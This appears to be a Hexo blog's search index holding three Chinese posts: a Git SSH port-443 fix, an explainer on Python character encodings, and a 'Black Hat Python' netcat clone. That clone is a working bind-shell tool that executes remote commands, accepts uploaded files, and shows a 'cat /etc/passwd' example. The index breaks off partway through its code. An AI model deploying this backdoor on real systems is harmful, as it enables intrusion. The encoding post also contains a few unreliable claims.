<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Git 提交出现ssh connection time out</title>
      <link href="/2018/11/12/Git-%E6%8F%90%E4%BA%A4%E5%87%BA%E7%8E%B0ssh-connection-time-out/"/>
      <url>/2018/11/12/Git-%E6%8F%90%E4%BA%A4%E5%87%BA%E7%8E%B0ssh-connection-time-out/</url>
      
        <content type="html"><![CDATA[<p>提交文章发生了奇怪的错误<br><a id="more"></a></p><h3 id="突然的错误"><a href="#突然的错误" class="headerlink" title="突然的错误"></a>突然的错误</h3><p>我今天进行提交新的博文，突然提交不上去，<br>报错如图<br><img src="/2018/11/12/Git-提交出现ssh-connection-time-out/1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prot 22: Operation timed out</span><br></pre></td></tr></table></figure></p><p>初步判断为端口问题，那么除了ssh端口我们还可以用<strong>https 443</strong>端口</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>博主本机为<strong>win10</strong>，那么在<code>/git/etc/ssh/ssh_config</code>文件末尾增加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User YourEmail@xx.com</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure><p>然后保存。<br>然后继续在git bash中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;XXX&quot;</span><br><span class="line">git config --global user.email xxxx@xx.com</span><br></pre></td></tr></table></figure></p><p>刷新就可以生效</p><hr><p><strong>linux</strong>中在<code>~/.ssh</code>新建<code>config</code>输入以下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User YourEmail@xx.com</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure></p><p>后续内容跟上面内容一样更新即可。最后运行<code>ssh -T git@github.com</code>，查看是否连接成功。</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo常见问题 </tag>
            
            <tag> Git </tag>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python字符编码</title>
      <link href="/2018/10/17/python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/"/>
      <url>/2018/10/17/python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p> python的编码一直是个让我头疼的问题<br> <a id="more"></a><br>前言：中文编码问题一直是程序员头疼的问题，而Python2中的字符编码足矣令新手抓狂。本文将尽量用通俗的语言带大家彻底的了解字符编码以及Python2和3中的各种编码问题。</p><h2 id="什么是字符编码。"><a href="#什么是字符编码。" class="headerlink" title="什么是字符编码。"></a>什么是字符编码。</h2><p>要彻底解决字符编码的问题就不能不去了解到底什么是字符编码。计算机从本质上来说只认识二进制中的0和1，可以说任何数据在计算机中实际的物理表现形式也就是0和1，如果你将硬盘拆开，你是看不到所谓的数字0和1的，你能看到的只是一块光滑闪亮的磁盘，如果你用足够大的放大镜你就能看到磁盘的表面有着无数的凹凸不平的元件，凹下去的代表0，突出的代表1，这就是计算机用来表现二进制的方式。</p><h3 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h3><p>现在我们面临了第一个问题：如何让人类语言，比如英文被计算机理解？我们以英文为例，英文中有英文字母（大小写）、标点符号、特殊符号。如果我们将这些字母与符号给予固定的编号，然后将这些编号转变为二进制，那么计算机明显就能够正确读取这些符号，同时通过这些编号，计算机也能够将二进制转化为编号对应的字符再显示给人类去阅读。由此产生了我们最熟知的ASCII码。ASCII 码使用指定的7 位或8 位二进制数组合来表示128 或256 种可能的字符。这样在大部分情况下，英文与二进制的转换就变得容易多了。</p><h3 id="GB2312"><a href="#GB2312" class="headerlink" title="GB2312"></a>GB2312</h3><p>然而，虽然计算机是美国人发明的，但是全世界的人都在使用计算机。现在出现了另一个问题：如何让中文被计算机理解？这下麻烦了，中文不像拉丁语系是由固定的字母排列组成的。ASCII 码显然没办法解决这个问题，为了解决这个问题中国国家标准总局1980年发布《信息交换用汉字编码字符集》提出了GB2312编码，用于解决汉字处理的问题。1995年又颁布了《汉字编码扩展规范》（GBK）。GBK与GB 2312—1980国家标准所对应的内码标准兼容，同时在字汇一级支持ISO/IEC10646—1和GB 13000—1的全部中、日、韩（CJK）汉字，共计20902字。这样我们就解决了计算机处理汉字的问题了。</p><h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><p>现在英文和中文问题被解决了，但新的问题又出现了。全球有那么多的国家不仅有英文、中文还有阿拉伯语、西班牙语、日语、韩语等等。难不成每种语言都做一种编码？基于这种情况一种新的编码诞生了：Unicode。Unicode又被称为统一码、万国码；它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。Unicode支持欧洲、非洲、中东、亚洲（包括统一标准的东亚象形汉字和韩国表音文字）。这样不管你使用的是英文或者中文，日语或者韩语，在Unicode编码中都有收录，且对应唯一的二进制编码。这样大家都开心了，只要大家都用Unicode编码，那就不存在这些转码的问题了，什么样的字符都能够解析了。</p><h3 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h3><p>但是，由于Unicode收录了更多的字符，可想而知它的解析效率相比ASCII码和GB2312的速度要大大降低，而且由于Unicode通过增加一个高字节对ISO Latin-1字符集进行扩展，当这些高字节位为0时，低字节就是ISO Latin-1字符。对可以用ASCII表示的字符使用Unicode并不高效，因为Unicode比ASCII占用大一倍的空间，而对ASCII来说高字节的0对他毫无用处。为了解决这个问题，就出现了一些中间格式的字符集，他们被称为通用转换格式，即UTF（Unicode Transformation Format）。而我们最常用的UTF-8就是这些转换格式中的一种。在这里我们不去研究UTF-8到底是如何提高效率的，你只需要知道他们之间的关系即可。</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul><li>为了处理英文字符，产生了ASCII码。</li><li>为了处理中文字符，产生了GB2312。</li><li>为了处理各国字符，产生了Unicode。</li><li>为了提高Unicode存储和传输性能，产生了UTF-8，它是Unicode的一种实现形式。</li></ul><h2 id="Python2中的字符编码"><a href="#Python2中的字符编码" class="headerlink" title="Python2中的字符编码"></a>Python2中的字符编码</h2><h3 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h3><p><strong>Python2中默认的字符编码是ASCII码</strong>，也就是说Python在处理数据时，只要数据没有指定它的编码类型，Python默认将其当做ASCII码来进行处理。<br><img src="/2018/10/17/python字符编码/1.png" alt="1.png"><br>这个问题出现的原因是：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```text</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br></pre></td></tr></table></figure></p><p>这样，Python在处理这个脚本时，会用UTF-8的编码去处理整个脚本，就能够正确的解析中文字符了。</p><h3 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h3><ul><li>Python2中默认的字符编码是ASCII码。</li><li>Python2中字符串有str和unicode两种类型。str有各种编码的区别，unicode是没有编码的标准形式。</li><li>Python2中可以直接查看到unicode的字节串。</li></ul><h2 id="decode-与encode-方法"><a href="#decode-与encode-方法" class="headerlink" title="decode()与encode()方法"></a>decode()与encode()方法</h2><p>前面我们说了这么多都是为了这一节做铺垫，现在我们开始来处理Python2中的字符编码问题。我们首先要学习Python为我们提供的两个转换编码的方法decode()与encode()。</p><p><strong>decode()方法将其他编码字符转化为Unicode编码字符。</strong><br><strong>encode()方法将Unicode编码字符转化为其他编码字符。</strong></p><p>chardet模块可以检测字符串编码，没有该模块的可以用pip install chardet安装。</p><p><img src="/2018/10/17/python字符编码/2.png" alt="2.png"><br>首先解释一下为什么name=”小明” 这里的小明是一个utf-8编码的字符。<strong>因为我使用的是win10操作系统，但是终端格式我默认设置utf-8,所以当我在终端将一个中文输入时，系统就会自动将这个中文字符以UTF-8的编码传递给Python。</strong>大多数情况下windows的系统编码默认是gb2312，那么在windows下做上图的测试“小明”这个字符就是gb2312编码。然而现在win10普遍都是ANSI字符集，产生了一个编码方式叫<code>TIS-620</code></p><p>所谓乱码本质上是系统编码与所提供字符的编码不一致导致的，我们举一个例子：</p><p>小明的电脑中存了一个utf-8的字母A，存储在计算机中是1100001；</p><p>小红的电脑中也存了一个gb2312的字母A，存储在计算机中是11000010；</p><p>当小明与小红交换信息时，各自的计算机就不会把对方传递过来的A识别为字母A，可能认为这是字母B。</p><p>所以当我们需要操作系统正确的输出一个字符时，除了要知道该字符的字符编码，也要知道自己系统所使用的字符编码。如果系统使用的是UTF-8编码，处理的却是gb2312的字符就会出现所谓“乱码”。</p><p>一个Tips：</p><p><strong>decode()方法与在字符串前加u的方法实现的效果相同比如u’小明’</strong></p><h3 id="总结：-2"><a href="#总结：-2" class="headerlink" title="总结："></a>总结：</h3><ul><li><p>Python2的对于字符编码的转换要以unicode作为“中间人”进行转化。</p></li><li><p>知道自己系统的字符编码（Linux默认utf-8，Windows默认GB2312），对症下药。</p></li></ul><p>所以我们再次强调：乱码本质上是系统编码与所提供字符的编码不一致导致的</p><p>在Pyhon3中字符编码有了很大改善最主要的有以下几点：</p><ul><li><p>Python 3的源码.py文件 的默认编码方式为UTF-8，所以在Python3中你可以不用在py脚本中写coding声明，并且系统传递给python的字符不再受系统默认编码的影响，统一为unicode编码。</p></li><li><p>将字符串和字节序列做了区别，字符串str是字符串标准形式与2.x中unicode类似，bytes类似2.x中的str有各种编码区别。bytes通过解码转化成str,str通过编码转化成bytes。</p></li></ul><p>PS：有一个小问题被许多新手所困扰，我们来看一下图片:</p><p><img src="/2018/10/17/python字符编码/3.png" alt=""></p><p>我们看到当一个中文字符出现在一个list(或tuple、dict)中时，它并不会被显示为一个中文而是字节串。但当该字符串从list中提取出来再print时就能够正常显示为中文。字节串是所有字符在python中的“本质”形态，所以你可以简单的理解为list中呈现出的字节串是给计算机看的。</p><hr>]]></content>
      
      
      <categories>
          
          <category> python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 程序基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python版netcat</title>
      <link href="/2018/10/01/python%E7%89%88netcat/"/>
      <url>/2018/10/01/python%E7%89%88netcat/</url>
      
        <content type="html"><![CDATA[<p>《python黑帽子编程》这本书可以提升自己的写脚本的水平<br><a id="more"></a><br>&nbsp;&nbsp;为了增进自己的python编程水平，于是选了《python黑帽子编程》这本书，写完一个小作业感觉受益良多，懂了些服务器客户端的通信方式，希望自己能够坚持下去。</p><p>  我已经将相关代码放到我的<a href="https://github.com/ssb6666/BlackHatCode" target="_blank" rel="noopener">github</a>，详情请点击链接，为了伟大的开源精神而干杯（手动doge）</p><hr><h3 id="具体代码，详情见注释"><a href="#具体代码，详情见注释" class="headerlink" title="具体代码，详情见注释"></a>具体代码，详情见注释</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义全局变量</span></span><br><span class="line">listen = <span class="keyword">False</span></span><br><span class="line">command = <span class="keyword">False</span></span><br><span class="line">execute = <span class="string">""</span></span><br><span class="line">target = <span class="string">""</span></span><br><span class="line">upload_destination = <span class="string">""</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span> <span class="comment"># 帮助说明</span></span><br><span class="line">    print(<span class="string">"BHP Net Tool\n\n"</span>)</span><br><span class="line">    print(<span class="string">"Usage: nc.py -t target_host -p port"</span>)</span><br><span class="line">    print(</span><br><span class="line">        <span class="string">"-l --listen              \</span></span><br><span class="line"><span class="string">        - listen on [host]:[port] for incoming connections"</span>)</span><br><span class="line">    print(<span class="string">"-e --execute=file_to_run  \</span></span><br><span class="line"><span class="string">        -command execute the given file upon receiving a connection"</span>)</span><br><span class="line">    print(<span class="string">"-c --command              - initialize a command shell"</span>)</span><br><span class="line">    print(</span><br><span class="line">        <span class="string">"-u --upload=destination  \</span></span><br><span class="line"><span class="string">         - upon receiving connection upload  \</span></span><br><span class="line"><span class="string">         a file and write to [destination]\n\n"</span>)</span><br><span class="line">    print(<span class="string">"Examples: \n"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -c"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"</span>)</span><br><span class="line">    print(<span class="string">"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""</span>)</span><br><span class="line">    print(<span class="string">"echo 'ABCDEF' | nc.py -t 192.168.11.12 -p 135"</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="comment"># 如果没有定义目标，那么我们监听所有接口</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> len(target):</span><br><span class="line">        target = <span class="string">"0.0.0.0"</span></span><br><span class="line"></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target, port))</span><br><span class="line"></span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line">        <span class="comment"># 分拆一个线程处理新的客户端，client_socket返回一个socket对象（对应每个连接的对象）addr是具体的ip和端口</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            client_thread = threading.Thread(</span><br><span class="line">                target=client_handler, args=(client_socket,))</span><br><span class="line">            client_thread.start()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="comment"># socket对象</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 连接到目标主机</span></span><br><span class="line">        client.connect((target, port))</span><br><span class="line">        client.settimeout(<span class="number">30</span>)</span><br><span class="line">        <span class="keyword">if</span> len(buffer)!=<span class="number">0</span>:</span><br><span class="line">            client.send(buffer.encode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 现在等待数据回传</span></span><br><span class="line">            recv_len = <span class="number">1</span></span><br><span class="line">            response = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line">                data = client.recv(<span class="number">4096</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">                recv_len = len(data)</span><br><span class="line">                response += data</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> recv_len &lt; <span class="number">4096</span>:  <span class="comment"># 一次接受4096个字节</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            print(<span class="string">"client: "</span>+response.strip(<span class="string">"\n"</span>))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 等待更多输入</span></span><br><span class="line">            buffer = <span class="string">"server: "</span></span><br><span class="line">            buffer += input()</span><br><span class="line">            buffer += <span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送出去</span></span><br><span class="line">            client.send(buffer.encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        print(<span class="string">"[*] Exception! Exiting"</span>)</span><br><span class="line">        <span class="comment"># 关闭连接</span></span><br><span class="line">        client.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(command)</span>:</span></span><br><span class="line">    <span class="comment"># 换行</span></span><br><span class="line">    command = command.rstrip()</span><br><span class="line">    <span class="comment"># 运行命令并将输出返回</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(</span><br><span class="line">            command, stderr=subprocess.STDOUT, shell=<span class="keyword">True</span>, universal_newlines=<span class="keyword">True</span>) <span class="comment"># 命令执行模块</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        output = <span class="string">"Failed to execute command.\r\n"</span></span><br><span class="line">    <span class="comment"># 将输出发送</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(client_socket)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测上传文件</span></span><br><span class="line">    <span class="keyword">if</span> len(upload_destination):</span><br><span class="line">        <span class="comment"># 读取所有字符并写下目标</span></span><br><span class="line">        file_buffer = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 持续读取数据直到没有符合的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            data = client_socket.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_buffer += data</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"#"</span> <span class="keyword">in</span> file_buffer:</span><br><span class="line">                file_buffer = file_buffer[:<span class="number">-2</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 现在我们接收这些数据并将它们写出来</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor = open(upload_destination, <span class="string">"wb"</span>)</span><br><span class="line">            file_descriptor.write(file_buffer.encode())</span><br><span class="line">            file_descriptor.close()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 确认文件已经写出来</span></span><br><span class="line">            client_socket.send(<span class="string">b"Succesfully saved file"</span>) </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="string">b"Failed to saved file"</span>)</span><br><span class="line">        client_socket.close() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(execute):</span><br><span class="line">        <span class="comment"># 运行命令</span></span><br><span class="line">        output = run_command(execute)</span><br><span class="line">        client_socket.send(output.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果需要一个命令行shell，那么我们进另一个循环</span></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="comment"># 跳出一个窗口</span></span><br><span class="line">            client_socket.send(<span class="string">b"&lt;BHP:#&gt;: "</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 现在我们接受文件直到发现换行符(enter key)</span></span><br><span class="line">            cmd_buffer = <span class="string">""</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                cmd_buffer = client_socket.recv(<span class="number">1024</span>).decode(<span class="string">"gbk"</span>)</span><br><span class="line">                <span class="comment"># 反还命令输出</span></span><br><span class="line">                response = run_command(cmd_buffer)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 返回相应数据</span></span><br><span class="line">                client_socket.send(response.encode())  <span class="comment"># python3中必须以BYTE流进行传输</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> listen  <span class="comment"># 全局变量</span></span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line"><span class="comment"># getopt 模块，该模块是专门用来处理命令行参数的</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span>(len(sys.argv[<span class="number">1</span>:])):  <span class="comment"># sys.argv[0]代表脚本本身名称</span></span><br><span class="line">        usage()</span><br><span class="line"><span class="comment"># 读取命令行</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">"hle:t:p:cu:"</span>, [</span><br><span class="line">                                   <span class="string">"help"</span>, <span class="string">"listen"</span>, <span class="string">"execute="</span>, <span class="string">"target="</span>, <span class="string">"port="</span>, <span class="string">"command="</span>, <span class="string">"upload="</span>])</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        print(str(err))</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> o, a <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>, <span class="string">"--help"</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-l"</span>, <span class="string">"--listen"</span>):</span><br><span class="line">            listen = <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-e"</span>, <span class="string">"--execute"</span>):</span><br><span class="line">            execute = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-c"</span>, <span class="string">"--command"</span>):</span><br><span class="line">            command = <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-u"</span>, <span class="string">"--upload"</span>):</span><br><span class="line">            upload_destination = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-t"</span>, <span class="string">"--target"</span>):</span><br><span class="line">            target = a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-p"</span>, <span class="string">"--port"</span>):</span><br><span class="line">            port = int(a)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="keyword">False</span>, <span class="string">"Unhandled Option"</span></span><br><span class="line">            <span class="comment"># assert相当于断点，根据后面的表达式的布尔值进行判断，如果错误输出之后的字符串信息。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行监听还是仅从标准输入发送数据？</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> len(target) <span class="keyword">and</span> (port &gt; <span class="number">0</span>):</span><br><span class="line">        buffer = <span class="string">""</span></span><br><span class="line">        <span class="comment"># 从命令行读取内存数据</span></span><br><span class="line">        <span class="comment"># 这里将会堵塞，所以不在向标准输入发送数据时发送CTRL+D·</span></span><br><span class="line">        buffer = input() + <span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送数据</span></span><br><span class="line">        client_sender(buffer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始监听并准备上传文件、执行命令</span></span><br><span class="line">    <span 